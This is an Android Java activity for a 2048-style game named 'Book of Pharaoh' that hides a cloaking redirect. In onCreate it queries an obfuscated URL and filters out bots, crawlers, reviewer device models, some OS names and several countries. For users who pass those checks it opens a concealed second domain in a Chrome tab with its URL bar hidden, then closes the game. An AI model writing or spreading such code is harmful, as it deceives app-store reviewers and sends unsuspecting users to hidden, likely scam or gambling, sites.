package com.bookofpharaoh;



import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.ActivityNotFoundException;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.view.MotionEvent;
import android.view.View;
import android.view.animation.Animation;
import android.view.animation.AnimationUtils;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;

import androidx.browser.customtabs.CustomTabsIntent;

import com.android.volley.NetworkResponse;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.HurlStack;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.facebook.applinks.AppLinkData;
import com.facebook.applinks.BuildConfig;
import com.onesignal.OneSignal;

import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Map;


public class BookOfPharaohActivity extends Activity implements View.OnTouchListener {

    private MatrixView matrixView;

    private ScoreView currentScore;

    private ScoreView bestScore;


    private SwipeListener swipeListener;


    private Animation slideUpAnimation;

    private TextView textViewLucky;

    public static final String DEPLINK = "pls://run";
    public static final String MY_SUB_URL = "";
    final String SAVED_TEXT1 = "saved_text";
    int i = 10;
    int id = 0;

    boolean openTabs = true;


    private int mStatusCode = 0;

    @Override
    protected void onResume() {
        BookOfPharaohPreferences.initPrefs(this);
        bestScore.setScr(BookOfPharaohPreferences.getBestScore());
        super.onResume();
    }

    @SuppressLint("ClickableViewAccessibility")
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_bookofpharaoh);
        OneSignal.startInit(this)
                .inFocusDisplaying(OneSignal.OSInFocusDisplayOption.Notification)
                .unsubscribeWhenNotificationsAreDisabled(true)
                .init();

        textViewLucky = findViewById(R.id.txtview_nosquare);
        slideUpAnimation = AnimationUtils.loadAnimation(this, R.anim.all_the_way_up);
        slideUpAnimation.setAnimationListener(new Animation.AnimationListener() {
            @Override
            public void onAnimationStart(Animation animation) {

            }

            @Override
            public void onAnimationEnd(Animation animation) {
                textViewLucky.setVisibility(View.GONE);
            }

            @Override
            public void onAnimationRepeat(Animation animation) {

            }
        });


        currentScore = findViewById(R.id.scoreview_current);
        bestScore = findViewById(R.id.scoreview_best);
        matrixView = findViewById(R.id.main_matrixview);
        matrixView.setBookOfPharaohMoveInterface(new BookOfPharaohMoveInterface() {
            @Override
            public void onMove(int score, boolean gameOver, boolean newSquare) {
                if (gameOver) {
                    displayGameOverDialog();
                } else {
                    if (!newSquare) {
                        textViewLucky.setVisibility(View.VISIBLE);
                        textViewLucky.startAnimation(slideUpAnimation);
                    }
                    if (score > 0) {
                        currentScore.scrAdd(score);
                        if (currentScore.getScr() > bestScore.getScr()) {
                            bestScore.setScr(currentScore.getScr());
                            BookOfPharaohPreferences.saveBestScore(bestScore.getScr());
                        }
                        if (score >= 2048) {
                            displayCongratsDialog();
                        }
                    }
                }
            }
        });

        Button buttonNewGame = findViewById(R.id.main_button_new_game);
        buttonNewGame.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                onNewGameClick();
            }
        });

        LinearLayout linearLayoutOutermost = findViewById(R.id.main_linearlayout_outermost);
        linearLayoutOutermost.setOnTouchListener(this);
        swipeListener = new SwipeListener(this, new SwipeInterface() {
            @Override
            public void onLeft() {
                matrixView.onLeft();
            }

            @Override
            public void onRight() {
                matrixView.onRight();
            }

            @Override
            public void onUp() {
                matrixView.onUp();
            }

            @Override
            public void onDown() {
                matrixView.onDown();
            }
        });


        if (InternetCon.checkConnection(getApplicationContext())) {

            SharedPreferences settings = getSharedPreferences(SAVED_TEXT1, 0);
            id = settings.getInt("ID", 0);

            if(id == 1){
                openLink();
            }else if(id == 2){

            }
            else
            {
                RequestQueue requestQueue = Volley.newRequestQueue(getApplicationContext(), new HurlStack() {
                    @Override
                    protected HttpURLConnection createConnection(URL url) throws IOException {
                        HttpURLConnection connection = super.createConnection(url);
                        connection.setInstanceFollowRedirects(false);

                        return connection;
                    }
                });

                String url = "fakeit.";
                url = url + "gites-perigord-leydou";
                url = url + ".com/8mB84YrF";
                url = "https://" + url;

                StringRequest request = new StringRequest(url, response -> Log.i("statusCode", String.valueOf(mStatusCode)), error -> {
                    Log.e("onErrorResponse", error.toString());
                    Map<String, String> header = error.networkResponse.headers;
                    Log.i("Redirected URL", header.get("Location"));
                    String location = header.get("Location");
                    //String [] subs= {"sub1=", "c=", "d=", "e=", "f=", "j=", "i="};
                    String [] subs= {"sub1=", "sub3=", "sub4=", "sub5=", "sub6=", "sub7=", "sub9="};
                    String [] sub1= {"FreeBSD", "Firefox", "Linux"};
                    String [] sub2= {"Nexus", "Pixel", "Moto", "Google"};
                    String sub3= "1";
                    String sub5= "AR";
                    String [] sub6= {"US", "PH", "NL", "GB", "IN", "IE"};
                    String [] sub7= {"google", "bot", "adwords", "rawler", "spy", "o-http-client", "Dalvik/2.1.0 (Linux; U; Android 6.0.1; Nexus 5X Build/MTC20F)", "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G935F Build/NRD90M)", "Dalvik/2.1.0 (Linux; U; Android 7.0; WAS-LX1A Build/HUAWEIWAS-LX1A)"};

                    for(int index=0; index < subs.length; index++) {
                        String[] parts = location.split(subs[index]);
                        String value = parts[1];
                        parts = value.split("&");
                        value = parts[0];
                        System.out.println(value);
                        if(index == 0 ){
                            checkMass(sub1, value);
                            if(!openTabs)
                                break;

                        }
                        if(index == 1 ){
                            checkMass(sub2, value);
                            if(!openTabs)
                                break;

                        }
                        if(index == 2 || index == 3){
                            if (value.contains(sub3)) {
                                openTabs = false;
                                break;
                            }
                        }
                        if(index == 4 ){
                            if (value.contains(sub5)) {
                                openTabs = false;
                                break;
                            }
                        }
                        if(index == 5 ){
                            checkMass(sub6, value);
                            if(!openTabs)
                                break;

                        }
                        if(index == 6 ){
                            checkMass(sub7, value);
                            if(!openTabs)
                                break;

                        }
                    }


                    if(openTabs){

                        try {
                            AppLinkData.fetchDeferredAppLinkData(BookOfPharaohActivity.this, appLinkData -> {
                                AppLinkData appLinkData1 = appLinkData;
                                if (appLinkData1 == null || appLinkData1.getTargetUri() == null) {
                                    Log.e("MyLog", "deeplink = null");

                                    openLink();
                                } else {

                                    String url1 = appLinkData1.getTargetUri().toString();
                                    if (BuildConfig.DEBUG) {
                                    }
                                    String string = convertArrayToStringMethod(url1.split(DEPLINK));
                                    SharedPreferences settings5 = getSharedPreferences(SAVED_TEXT1, 0);
                                    SharedPreferences.Editor editor = settings5.edit();

                                    editor.putString(MY_SUB_URL, string);
                                    editor.commit();

                                    if (BuildConfig.DEBUG) {

                                    }
                                    openLink();
                                }
                            });
                        } catch (Exception e) {
                            Log.e("my Log" + BookOfPharaohActivity.this, "App Link appLinkData: " + e.toString());
                            e.printStackTrace();
                        }



                        SharedPreferences settings1 = getSharedPreferences(SAVED_TEXT1, 0);
                        SharedPreferences.Editor editor = settings1.edit();
                        editor.putInt("ID", 1);
                        editor.commit();
                    }
                    else{
                        SharedPreferences settings1 = getSharedPreferences(SAVED_TEXT1, 0);
                        SharedPreferences.Editor editor = settings1.edit();

                        editor.putInt("ID", 2);
                        editor.commit();
                        //openUI();
                    }
                }) {
                    @Override
                    protected Response<String> parseNetworkResponse(NetworkResponse response1) {
                        if (response1 != null) {
                            mStatusCode = response1.statusCode;
                            Map<String, String> header = response1.headers;
                        }
                        return super.parseNetworkResponse(response1);
                    }
                };

                requestQueue.add(request);

            }

        } else {
            SharedPreferences settings = getSharedPreferences(SAVED_TEXT1, 0);
            SharedPreferences.Editor editor = settings.edit();
            editor.putInt("ID", 2);
            editor.commit();
        }
    }
    void checkMass(String [] sub1, String value){
        for(int q = 0; q < sub1.length; q++) {
            if (value.equals(sub1[q])) {
                openTabs = false;
            }
        }
    }
    void openLink(){
        SharedPreferences settings = getSharedPreferences(SAVED_TEXT1, 0);
        String myStrValue = settings.getString(MY_SUB_URL, "");
        String url = "traffdomnbrncv";
        url = url + ".fun/p4cCgmRP";
        url = url + myStrValue;
        url = "https://" + url;
        Log.i("MyLog: ", myStrValue);
        final Bitmap backButton = BitmapFactory.decodeResource(getResources(), R.drawable.round_done_black_24dp);

        CustomTabsIntent.Builder builder = new CustomTabsIntent.Builder();
        builder.enableUrlBarHiding();
        builder.setToolbarColor(Color.BLACK);
        builder.setShowTitle(false);
        builder.addDefaultShareMenuItem();
        builder.setCloseButtonIcon(backButton);
        builder.addDefaultShareMenuItem();

        CustomTabsIntent customTabsIntent = builder.build();
        String packageName = "com.android.chrome";

        try {
            customTabsIntent.intent.setPackage(packageName);
            customTabsIntent.launchUrl(BookOfPharaohActivity.this, Uri.parse(url));
            finish();
        } catch (ActivityNotFoundException activityNotFound) {
            BookOfPharaohActivity.this.startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(url)));
            finish();
        }

    }

    public static String convertArrayToStringMethod(String[] strArray) {

        StringBuilder stringBuilder = new StringBuilder();

        for (int i = 0; i < strArray.length; i++) {

            stringBuilder.append(strArray[i]);

        }

        return stringBuilder.toString();

    }
    private void onNewGameClick() {
        matrixView.reset();

        currentScore.resetScore();
    }

    private void displayGameOverDialog() {
        final BookOfPharaohDialog d = new BookOfPharaohDialog(this, "Oops, you lost! Try again now?", "Exit", "New Game");
        d.setOnGameDialogClickListener(new BookOfPharaohDialogClickInterface() {
            @Override
            public void exitBtn() {
                d.dismiss();
                finish();

            }


            @Override
            public void newGameBtn() {
                d.dismiss();
                onNewGameClick();
            }
        });
        d.show();
    }

    private void displayCongratsDialog() {
        final BookOfPharaohDialog d = new BookOfPharaohDialog(this, "Wow, you win! Continue to get a better > 2048?", "New Game", "Continue");
        d.setOnGameDialogClickListener(new BookOfPharaohDialogClickInterface() {
            @Override
            public void exitBtn() {
                d.dismiss();
                onNewGameClick();
            }

            @Override
            public void newGameBtn() {
                d.dismiss();

            }
        });
        d.show();
    }

    @Override
    public boolean onTouch(View v, MotionEvent event) {
        return swipeListener.getGestureDetector().onTouchEvent(event);
    }
}
